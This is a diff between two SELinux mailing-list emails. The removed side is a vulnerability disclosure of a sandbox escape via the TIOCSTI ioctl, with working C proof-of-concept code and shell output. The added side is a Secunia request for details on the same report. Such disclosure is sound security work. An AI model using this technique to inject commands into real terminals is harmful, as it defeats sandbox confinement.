@@ -1,65 +1,47 @@
 Received: from goalie.tycho.ncsc.mil (goalie [144.51.242.250])
- by tarius.tycho.ncsc.mil (8.14.4/8.14.4) with ESMTP id u8N9NwlI026995
- for <selinux@tycho.nsa.gov>; Fri, 23 Sep 2016 05:23:59 -0400
-Received: from localhost (localhost [127.0.0.1])
- by smtp.alunos.dcc.fc.up.pt (Postfix) with ESMTP id DC6CAACE5C
- for <selinux@tycho.nsa.gov>; Fri, 23 Sep 2016 10:23:53 +0100 (WEST)
-Received: from smtp.alunos.dcc.fc.up.pt ([127.0.0.1])
- by localhost (mail.alunos.dcc.fc.up.pt [127.0.0.1]) (amavisd-new, port 10025)
- with LMTP id 18110-08-2 for <selinux@tycho.nsa.gov>;
- Fri, 23 Sep 2016 10:23:52 +0100 (WEST)
-Received: from webmail.alunos.dcc.fc.up.pt (webmail.alunos.dcc.fc.up.pt
- [192.168.0.11])
- by smtp.alunos.dcc.fc.up.pt (Postfix) with ESMTP id 3E4E4ACE5B
- for <selinux@tycho.nsa.gov>; Fri, 23 Sep 2016 10:23:51 +0100 (WEST)
-Message-ID: <20160923112350.89325hv7y899lack@webmail.alunos.dcc.fc.up.pt>
-Date: Fri, 23 Sep 2016 11:23:50 +0200
-From: up201407890@alunos.dcc.fc.up.pt
-To: selinux@tycho.nsa.gov
-Subject: SELinux sandbox escape via TIOCSTI ioctl
+ by tarius.tycho.ncsc.mil (8.14.4/8.14.4) with ESMTP id u8NCXPiE013343
+ for <selinux@tycho.nsa.gov>; Fri, 23 Sep 2016 08:33:25 -0400
+From: "Secunia Research" <vuln@secunia.com>
+To: <selinux@tycho.nsa.gov>
+Cc: <vuln@secunia.com>
+References: <7803DB77C012DF4F825DB4445A696E5721643060@SCHEXMB1.acresso.com>
+In-Reply-To: <7803DB77C012DF4F825DB4445A696E5721643060@SCHEXMB1.acresso.com>
+Subject: [Secunia Research] policycoreutils Vulnerability - Request for Details
+Date: Fri, 23 Sep 2016 14:33:08 +0200
+Message-ID: <005b01d21596$a3a0d570$eae28050$@secunia.com>
 MIME-Version: 1.0
 Content-Type: text/plain;
-	charset=ISO-8859-1;
-	DelSp="Yes";
-	format="flowed"
+	charset="us-ascii"
 List-Id: "Security-Enhanced Linux \(SELinux\) mailing list"
  <selinux.tycho.nsa.gov>
 List-Post: <mailto:selinux@tycho.nsa.gov>
 List-Help: <mailto:selinux-request@tycho.nsa.gov?subject=help>
 
-Hi,
+Hello,
 
-When executing a program via the SELinux sandbox, the nonpriv session  
-can escape to the parent session by using the TIOCSTI ioctl to push  
-characters into the terminal's input buffer, allowing an attacker to  
-escape the sandbox.
+We are currently processing a vulnerability report published by a third-party [1] for policycoreutils and are currently evaluating
+it to publish a Secunia Advisory for this. Please see the original report for details.
 
-$ cat test.c
-#include <unistd.h>
-#include <sys/ioctl.h>
+We would appreciate to receive your comments on this issue to properly evaluate the report.
 
-int main()
-{
-   char *cmd = "id\n";
-   while(*cmd)
-    ioctl(0, TIOCSTI, cmd++);
-   execlp("/bin/id", "id", NULL);
-}
+* Can you confirm the vulnerability?
+* Which products and versions are affected by the vulnerability?
+* When do you expect to release fixed versions?
+* Are there any mitigating factors or recommended workarounds?
 
-$ gcc test.c -o test
-$ /bin/sandbox ./test
-id
-uid=1000 gid=1000 groups=1000  
-context=unconfined_u:unconfined_r:sandbox_t:s0:c47,c176
-$ id    <------ did not type this
-uid=1000(saken) gid=1000(saken) groups=1000(saken)  
-context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+Reference:
+[1] https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=838599
 
+Many thanks and best regards,
+Laurent Delosieres 
+Security Specialist 
 
-This is similar to CVE-2016-2568, CVE-2016-2779, etc.
+Secunia Research at Flexera Software
 
-Thanks,
-Federico Bento.
+Rued Langgaardsvej 8
+2300 Copenhagen S
+Denmark
+Phone +45 7020 5144
+Fax +45 7020 5145
 
-----------------------------------------------------------------
-This message was sent using IMP, the Internet Messaging Program.
+http://www.flexerasoftware.com
